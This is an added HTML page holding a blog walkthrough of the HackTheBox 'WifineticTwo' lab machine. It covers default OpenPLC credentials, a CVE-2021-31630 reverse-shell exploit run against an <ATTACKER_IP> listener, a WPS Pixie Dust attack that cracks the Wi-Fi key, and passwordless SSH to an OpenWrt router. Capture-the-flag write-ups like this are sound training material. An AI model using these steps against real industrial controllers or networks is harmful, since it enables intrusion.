@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="generator" content="Hugo 0.124.0">
+
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="ShellUnease Writeups" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="itsec,hackthebox" />
+        
+
+        
+            <meta
+                name="author"
+                content="ShellUnease" />
+        
+
+    
+
+
+    <title>
+        
+            HackTheBox WifineticTwo |
+            ShellUnease Writeups
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6851612176967065231.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.32bbc9e317885f760335567ffdb38ffb3f78b2ea882ca0c96ea88480ce3e99695dc3db7c636b5bb9ede70de767ebded7a2e75a4c4c73d517d989bce4248a9652.css"
+                integrity="sha512-MrvJ4xeIX3YDNVZ//bOP&#43;z94suqILKDJbqiEgM4&#43;mWldw9t8Y2tbue3nDedn697XoudaTExz1RfZibzkJIqWUg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.3a62b6455f48a2646452c5340f1969d117aab5f496c89c3dbd966955329329d5abd02be43fb3bf501d4b056a62d3f4e3e27fb6a2c385921a91d2f3033228a9a8.css"
+                integrity="sha512-OmK2RV9IomRkUsU0Dxlp0ReqtfSWyJw9vZZpVTKTKdWr0CvkP7O/UB1LBWpi0/Tj4n&#43;2osOFkhqR0vMDMiipqA==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            HackTheBox WifineticTwo -
+            ShellUnease Writeups
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Posts </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/htb-wifinetic-two/" title="./posts/htb-wifinetic-two/">
+                        HackTheBox WifineticTwo
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/offsec-pwned/" title="./posts/offsec-pwned/">
+                        Offsec Pwned1
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/htb-insomnia/" title="./posts/htb-insomnia/">
+                        HackTheBox Insomnia
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/htb-ca-2024-apexsurvive/" title="./posts/htb-ca-2024-apexsurvive/">
+                        HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                HackTheBox WifineticTwo
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/shellunease/"
+                                class="cat-btn">
+                                ShellUnease
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.03.16"
+                            >2024.03.16
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        6 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+                <div class="categories">
+                    <i
+                        class="bi bi-bookmarks"
+                        title="Categories"></i>
+                    
+                        <a
+                            href="/categories/hackthebox/"
+                            class="cat-btn">
+                            HackTheBox
+                        </a>
+                    
+                        <a
+                            href="/categories/machine/"
+                            class="cat-btn">
+                            Machine
+                        </a>
+                    
+                        <a
+                            href="/categories/medium/"
+                            class="cat-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/categories/season-4/"
+                            class="cat-btn">
+                            Season 4
+                        </a>
+                    
+                </div>
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/" class="bread-btn">
+    
+
+    
+        Posts
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/htb-wifinetic-two/" class="bread-btn">
+    
+
+    
+        HackTheBox WifineticTwo
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#rce-via-openplc-webserver-v3">RCE via OpenPLC Webserver v3</a></li>
+    <li><a href="#acquiring-wi-fi-password-using-pixie-dust-attack-with-oneshotpy">Acquiring Wi-Fi password using Pixie Dust attack with oneshot.py</a></li>
+    <li><a href="#unprotected-ssh-access-to-the-router">Unprotected SSH access to the router</a></li>
+    <li><a href="#references">References:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="enumeration">Enumeration</h2>
+<p>We begin with a TCP nmap scan.</p>
+<pre><code>sudo nmap -vv --reason -Pn -p- -T5 -sVC --version-all -A -oN nmap-result-tcp.txt 10.129.128.171
+</code></pre>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code># Nmap 7.94SVN scan initiated Sun Mar 17 16:12:04 2024 as: nmap -vv --reason -Pn -p- -T5 -sVC --version-all -A -oN nmap-result-tcp.txt 10.129.128.171                                                      
+Nmap scan report for 10.129.128.171                                                                                                                                                                        
+Host is up, received user-set (0.11s latency).                                                                                                                                                             
+Scanned at 2024-03-17 16:12:04 CET for 161s                                                                                                                                                                
+Not shown: 65533 closed tcp ports (reset)                                                                                                                                                                  
+PORT     STATE SERVICE    REASON         VERSION                                                                                                                                                           
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                                                                     
+| ssh-hostkey:                                                                                                                                                                                             
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)                                                                                                                                             
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN&#43;Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77&#43;MWEA&#43;kT0pAw1xW9bpkhYCGkJQm9OYdc
+sEEg1i&#43;kQ/ng3&#43;GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y&#43;5ru184QQXjW/ir&#43;lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe&#43;au&#43;2yPotnOGBBJBz3ef&#43;fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7&#43;ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy&#43;lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89&#43;TnjGFY2QTzxmbmU=                                                       
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                                                                                                                                            
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=                                         
+|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                                                                                                                                          
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa&#43;OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR                                                                                                                         
+8080/tcp open  http-proxy syn-ack ttl 63 Werkzeug/1.0.1 Python/2.7.18
+...OMITTED...</code></pre>
+    
+</div>
+<p>We check port 8080 in our web browser and find an OpenPLC webserver.</p>
+<p><img src="openplc-webserver.png" alt="OpenPLC Webserver"></p>
+<p>We try using the default credentials <em>openplc:openplc</em> and successfully gain access.</p>
+<p><img src="openplc-dashboard.png" alt="OpenPLC Dashboard"></p>
+<h2 id="rce-via-openplc-webserver-v3">RCE via OpenPLC Webserver v3</h2>
+<p>We&rsquo;ll try peforming RCE CVE-2021-31630 using the script from <a href="https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html">https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html</a>. We analyze the script and change the line:</p>
+<pre><code>compile_program = options.url + '/compile-program?file=681871.st'
+</code></pre>
+<p>to adjust to the name of the program we found in the dashboard:</p>
+<pre><code>compile_program = options.url + '/compile-program?file=blank_program.st'
+</code></pre>
+<p>We set up a listener for the reverse shell.</p>
+<pre><code>nc -nvlp 4444
+</code></pre>
+<p>We launch our modified python script.</p>
+<pre><code>python3 exploit.py -u http://&lt;TARGET_IP&gt;:8080 -l openplc -p openplc -i &lt;ATTACKER_IP&gt; -r 4444
+</code></pre>
+<p>After a moment we successfully gain a reverse shell.</p>
+<p><img src="reverse-shell.png" alt="Reverse shell"></p>
+<p>The user flag is located at <em>/root/user.txt</em>.</p>
+<h2 id="acquiring-wi-fi-password-using-pixie-dust-attack-with-oneshotpy">Acquiring Wi-Fi password using Pixie Dust attack with oneshot.py</h2>
+<p>We stabilize our shell using following commmands.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="python3%20-c%20%27import%20pty;%20pty.spawn%28%22/bin/bash%22%29%27%0aexport%20TERM=xterm-256color%20SHELL=bash%0aCTRL&#43;Z%0astty%20raw%20%20-echo;fg;reset%0astty%20rows%20%3cYOUR_TERMINAL_ROWS%3e%20columns%20%3cYOUR_TERMINAL_COLS%3e">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+export TERM=xterm-256color SHELL=bash
+CTRL&#43;Z
+stty raw  -echo;fg;reset
+stty rows &lt;YOUR_TERMINAL_ROWS&gt; columns &lt;YOUR_TERMINAL_COLS&gt;</code></pre>
+    
+</div>
+<p>We check network interfaces.</p>
+<pre><code>ifconfig
+</code></pre>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255
+        inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:fc:91:0c  txqueuelen 1000  (Ethernet)
+        RX packets 24588  bytes 2046665 (2.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15854  bytes 1796468 (1.7 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 10  bytes 576 (576.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10  bytes 576 (576.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre>
+    
+</div>
+<p>We find a <em>wlan0</em> interface. We&rsquo;ll scan it further.</p>
+<pre><code>iw dev wlan0 scan
+</code></pre>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>root@attica01:/opt/PLC/OpenPLC_v3/webserver# iw dev wlan0 scan
+BSS 02:00:00:00:01:00(on wlan0)
+        last seen: 16720.612s [boottime]
+        TSF: 1710689571207569 usec (19799d, 15:32:51)
+        freq: 2412
+        beacon interval: 100 TUs
+        capability: ESS Privacy ShortSlotTime (0x0411)
+        signal: -30.00 dBm
+        last seen: 0 ms ago
+        Information elements from Probe Response frame:
+        SSID: plcrouter
+        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
+        DS Parameter set: channel 1
+        ERP: Barker_Preamble_Mode
+        Extended supported rates: 24.0 36.0 48.0 54.0
+        RSN:     * Version: 1
+                 * Group cipher: CCMP
+                 * Pairwise ciphers: CCMP
+                 * Authentication suites: PSK
+                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+        Supported operating classes:
+                 * current operating class: 81
+        Extended capabilities:
+                 * Extended Channel Switching
+                 * SSID List
+                 * Operating Mode Notification
+        WPS:     * Version: 1.0
+                 * Wi-Fi Protected Setup State: 2 (Configured)
+                 * Response Type: 3 (AP)
+                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
+                 * Manufacturer:
+                 * Model:
+                 * Model Number:
+                 * Serial Number:
+                 * Primary Device Type: 0-00000000-0
+                 * Device name:
+                 * Config methods: Label, Display, Keypad
+                 * Version2: 2.0</code></pre>
+    
+</div>
+<p>We learn that it&rsquo;s using WPS. We&rsquo;ll attempt a WPS PIN attack using <a href="https://github.com/kimocoder/OneShot">https://github.com/kimocoder/OneShot</a>. We upload the <em>oneshot.py</em> file onto the machine and run a Pixie Dust attack.</p>
+<pre><code>python3 oneshot.py -i wlan0 -K
+</code></pre>
+<p>We successfully crack the PSK of AP with SSID <em>plcrouter</em>.</p>
+<p><img src="oneshot-success.png" alt="Oneshot success"></p>
+<h2 id="unprotected-ssh-access-to-the-router">Unprotected SSH access to the router</h2>
+<p>We connect to <em>plcrouter</em> using the following commands</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="wpa_passphrase%20plcrouter%20%22NoWWEDoKnowWhaTisReal123!%22%20%7c%20tee%20/etc/wpa_supplicant/wpa_supplicant.conf%0awpa_supplicant%20-c%20/etc/wpa_supplicant/wpa_supplicant.conf%20-i%20wlan0%20-B">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>wpa_passphrase plcrouter &#34;NoWWEDoKnowWhaTisReal123!&#34; | tee /etc/wpa_supplicant/wpa_supplicant.conf
+wpa_supplicant -c /etc/wpa_supplicant/wpa_supplicant.conf -i wlan0 -B</code></pre>
+    
+</div>
+<p>We request an IP address.</p>
+<pre><code>dhclient
+</code></pre>
+<p>We once again run <em>ifconig</em> to check our assigned IP address.</p>
+<p><img src="assigned-ip.png" alt="Assigned IP"></p>
+<p>We upload <em>nmap</em> and <em>run-nmap.sh</em> from <a href="https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.94SVN">https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.94SVN</a> onto the machine and perform a ping sweep of 192.168.1.0/24.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>root@attica01:/opt/PLC/OpenPLC_v3/webserver# ./run-nmap.sh -sn 192.168.1.0/24          
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 15:48 UTC
+Nmap scan report for 192.168.1.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000089s latency).
+MAC Address: 02:00:00:00:01:00 (Unknown)
+Nmap scan report for attica01.lan (192.168.1.84)
+Host is up.
+Nmap done: 256 IP addresses (2 hosts up) scanned in 1.87 seconds</code></pre>
+    
+</div>
+<p>We find another host in the network with the IP address 192.168.1.1. We probe it further with nmap.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>root@attica01:/opt/PLC/OpenPLC_v3/webserver# ./run-nmap.sh -vv --reason -Pn -p- -T5 -sT -oN nmap-result-tcp-internal.txt 192.168.1.1
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 15:50 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Unable to find nmap-protocols!  Resorting to /etc/protocols
+Initiating Parallel DNS resolution of 1 host. at 15:50
+Completed Parallel DNS resolution of 1 host. at 15:50, 0.00s elapsed
+Initiating Connect Scan at 15:50
+Scanning 192.168.1.1 [65535 ports]
+Discovered open port 53/tcp on 192.168.1.1
+Discovered open port 22/tcp on 192.168.1.1
+Discovered open port 80/tcp on 192.168.1.1
+Discovered open port 443/tcp on 192.168.1.1
+Completed Connect Scan at 15:50, 2.83s elapsed (65535 total ports)
+Nmap scan report for 192.168.1.1
+Host is up, received user-set (0.00038s latency).
+Scanned at 2024-03-17 15:50:52 UTC for 3s
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack
+53/tcp  open  domain  syn-ack
+80/tcp  open  http    syn-ack
+443/tcp open  https   syn-ack
+
+Read data files from: /etc
+Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds</code></pre>
+    
+</div>
+<p>We check port 80 with curl.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>root@attica01:/opt/PLC/OpenPLC_v3/webserver# curl http://192.168.1.1
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.1//EN&#34; &#34;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&#34;&gt;
+&lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;
+        &lt;head&gt;
+                &lt;meta http-equiv=&#34;Cache-Control&#34; content=&#34;no-cache, no-store, must-revalidate&#34; /&gt;
+                &lt;meta http-equiv=&#34;Pragma&#34; content=&#34;no-cache&#34; /&gt;
+                &lt;meta http-equiv=&#34;Expires&#34; content=&#34;0&#34; /&gt;
+                &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; URL=cgi-bin/luci/&#34; /&gt;
+                &lt;style type=&#34;text/css&#34;&gt;
+                        body { background: white; font-family: arial, helvetica, sans-serif; }
+                        a { color: black; }
+
+                        @media (prefers-color-scheme: dark) {
+                                body { background: black; }
+                                a { color: white; }
+                        }
+                &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+                &lt;a href=&#34;cgi-bin/luci/&#34;&gt;LuCI - Lua Configuration Interface&lt;/a&gt;
+        &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+    
+</div>
+<p>Based on the IP address and LuCI Lua configuration interface on port 80, we can make a reasonable guess that this is an OpenWRT router. We refer to <a href="https://openwrt.org/docs/guide-quick-start/sshadministration#ssh_access_for_newcomers">https://openwrt.org/docs/guide-quick-start/sshadministration#ssh_access_for_newcomers</a> and try to ssh to the host.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>root@attica01:/opt/PLC/OpenPLC_v3/webserver# ssh root@192.168.1.1
+The authenticity of host &#39;192.168.1.1 (192.168.1.1)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.1.1&#39; (ED25519) to the list of known hosts.
+
+
+BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ OpenWrt 23.05.2, r23630-842932a63d
+ -----------------------------------------------------
+=== WARNING! =====================================
+There is no root password defined on this device!
+Use the &#34;passwd&#34; command to set up a new password
+in order to prevent unauthorized SSH logins.
+--------------------------------------------------
+root@ap:~# ls -al
+drwxr-xr-x    2 root     root          4096 Jan  7 21:20 .
+drwxr-xr-x   17 root     root          4096 Mar 17 10:54 ..
+-rw-r-----    2 root     root            33 Mar 17 10:54 root.txt</code></pre>
+    
+</div>
+<p>We successfully gained access to the host and found the root flag.</p>
+<h2 id="references">References:</h2>
+<ul>
+<li><a href="https://www.cvedetails.com/cve/CVE-2021-31630/">https://www.cvedetails.com/cve/CVE-2021-31630/</a></li>
+<li><a href="https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html">https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html</a></li>
+<li><a href="https://github.com/kimocoder/OneShot/tree/master">https://github.com/kimocoder/OneShot/tree/master</a></li>
+<li><a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)</a></li>
+<li><a href="https://github.com/ernw/static-toolbox/releases">https://github.com/ernw/static-toolbox/releases</a></li>
+<li><a href="https://openwrt.org/docs/guide-quick-start/sshadministration#ssh_access_for_newcomers">https://openwrt.org/docs/guide-quick-start/sshadministration#ssh_access_for_newcomers</a></li>
+</ul>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>ShellUnease</li>
+            
+
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        1250
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.124.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Mar 16 2024 15:03:55
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
